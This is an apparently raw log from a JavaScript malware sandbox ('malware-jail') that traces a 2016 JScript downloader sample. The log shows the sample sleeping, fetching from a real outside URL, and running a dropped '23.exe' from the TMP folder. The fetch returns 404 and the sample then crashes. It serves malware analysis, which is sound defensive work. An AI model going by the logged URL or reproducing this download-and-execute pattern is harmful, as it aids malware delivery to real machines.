13 Oct 23: 49: 43 - mailware - jail, a malware sandbox ver.0.8
13 Oct 23: 49: 43 - -- -- -- -- -- -- -- -- -- -- -- --
    13 Oct 23: 49: 43 - Sandbox environment sequence: env / utils.js, env / eval.js, env / function.js, env / wscript.js, env / browser.js, env / agents.js, env / other.js, env / console.js
13 Oct 23: 49: 43 - Malware files: malware / 20161013 / _TMP__XipXkrLd.js
13 Oct 23: 49: 43 - Output file
for sandbox dump: sandbox_dump_after.json
13 Oct 23: 49: 43 - Output directory
for generated files: output /
    13 Oct 23: 49: 43 - == > Preparing Sandbox environment.
13 Oct 23: 49: 43 - => Executing: env / utils.js
13 Oct 23: 49: 43 - => Executing: env / eval.js
13 Oct 23: 49: 43 - Preparing sandbox to intercept eval() calls.
13 Oct 23: 49: 43 - => Executing: env / function.js
13 Oct 23: 49: 43 - Preparing sandbox to intercept 'new Function()'
calls.
13 Oct 23: 49: 43 - => Executing: env / wscript.js
13 Oct 23: 49: 43 - Preparing sandbox to emulate WScript environment.
13 Oct 23: 49: 43 - => Executing: env / browser.js
13 Oct 23: 49: 43 - Preparing sandbox to emulate Browser environment(
    default = IE11).
13 Oct 23: 49: 43 - Created: window[1]
13 Oct 23: 49: 43 - Created: document[2]
13 Oct 23: 49: 43 - document[2].createElement(html)
13 Oct 23: 49: 43 - Element[3] created, named: 'html'
13 Oct 23: 49: 43 - document[2].createElement(body)
13 Oct 23: 49: 43 - Element[5] created, named: 'body'
13 Oct 23: 49: 43 - document[2].body = 'Element[5]'
13 Oct 23: 49: 43 - document[2].createElement(head)
13 Oct 23: 49: 43 - Element[7] created, named: 'head'
13 Oct 23: 49: 43 - Element[3].appendChild(Element[7])
13 Oct 23: 49: 43 - Element[3].firstChild set
13 Oct 23: 49: 43 - document[2].body.get() => Element[5]
13 Oct 23: 49: 43 - Element[3].appendChild(Element[5])
13 Oct 23: 49: 43 - => Executing: env / agents.js
13 Oct 23: 49: 43 - Setting Browser environment to: IE8 on Win10 64 bit
13 Oct 23: 49: 43 - window[1].userAgent.get() => Mozilla / 4.0(compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident / 7.0; Touch;.NET4.0 C;.NET4.0E;....(truncated) 13 Oct 23: 49: 43 - => Executing: env / other.js 13 Oct 23: 49: 43 - => Executing: env / console.js 13 Oct 23: 49: 43 - == > Executing malware file(s).13 Oct 23: 49: 43 - => Executing: malware / 20161013 / _TMP__XipXkrLd.js 13 Oct 23: 49: 43 - WScript.Sleep(500) 13 Oct 23: 49: 44 - WScript.Sleep(500) 13 Oct 23: 49: 44 - WScript.Sleep(500) 13 Oct 23: 49: 45 - WScript.Sleep(500) 13 Oct 23: 49: 45 - WScript.Sleep(500) 13 Oct 23: 49: 46 - WScript.Sleep(500) 13 Oct 23: 49: 46 - WScript.Sleep(500) 13 Oct 23: 49: 47 - WScript.Sleep(500) 13 Oct 23: 49: 47 - WScript.Sleep(500) 13 Oct 23: 49: 48 - WScript.Sleep(500) 13 Oct 23: 49: 48 - WScript.Sleep(500) 13 Oct 23: 49: 49 - WScript.Sleep(500) 13 Oct 23: 49: 49 - ActiveXObject(WScript.Shell) 13 Oct 23: 49: 49 - Created: WScript.Shell[9] 13 Oct 23: 49: 49 - WScript.Shell[9].ExpandEnvironmentStrings( % TMP % ) 13 Oct 23: 49: 49 - ActiveXObject(MSXML2.XMLHTTP) 13 Oct 23: 49: 49 - Created: MSXML2.XMLHTTP[10] 13 Oct 23: 49: 49 - MSXML2.XMLHTTP[10].open(GET, http: //lcbschool2.ac.th/pic/_notes/logs.php,false)
            13 Oct 23: 49: 49 - MSXML2.XMLHTTP[10].async = (boolean)
            'false'
            13 Oct 23: 49: 49 - MSXML2.XMLHTTP[10].async.get() => (boolean)
            'false'
            13 Oct 23: 49: 49 - MSXML2.XMLHTTP[10].setRequestHeader(User - Agent, Python - urllib / 3.1) 13 Oct 23: 49: 49 - MSXML2.XMLHTTP[10].send(undefined) 13 Oct 23: 49: 52 - MSXML2.XMLHTTP[10].onreadystatechange(), readyState = 4 length: 16 status: 404 13 Oct 23: 49: 52 - MSXML2.XMLHTTP[10] statusText = null 13 Oct 23: 49: 52 - MSXML2.XMLHTTP[10].responseBody = (object)
            'File not found.?'
            13 Oct 23: 49: 52 - MSXML2.XMLHTTP[10].status = (number)
            '404'
            13 Oct 23: 49: 52 - MSXML2.XMLHTTP[10].onreadystatechange() undefined 13 Oct 23: 49: 52 - MSXML2.XMLHTTP[10].send(undefined) finished 13 Oct 23: 49: 52 - MSXML2.XMLHTTP[10].status.get() => (number)
            '404'
            13 Oct 23: 49: 52 - WScript.Shell[9].Run( % TMP % \23.e xe, 1, 0) 13 Oct 23: 49: 52 - Exception occured: object ReferenceError: MBGwN is not defined at OsLAgfHCfdr(malware / 20161013 / _TMP__XipXkrLd.js: 47: 1) at malware / 20161013 / _TMP__XipXkrLd.js: 15: 1 at ContextifyScript.Script.runInContext(vm.js: 35: 29) at Object.exports.runInContext(vm.js: 67: 17) at run_in_ctx(/media/usb
                2 / home / hynek / jscript / malware - jail / jailme.js: 145: 16) at Object. < anonymous > (/media/usb
                2 / home / hynek / jscript / malware - jail / jailme.js: 168: 1) at Module._compile(module.js: 556: 32) at Object.Module._extensions..js(module.js: 565: 10) at Module.load(module.js: 473: 32) at tryModuleLoad(module.js: 432: 12) 13 Oct 23: 49: 52 - == > Cleaning up sandbox.13 Oct 23: 49: 52 - == > Script execution finished, dumping sandbox environment to a file.13 Oct 23: 49: 52 - MSXML2.XMLHTTP[10].ResponseBody.get() => (object)
            'File not found.?'
            13 Oct 23: 49: 52 - The sandbox context has been saved to: sandbox_dump_after.json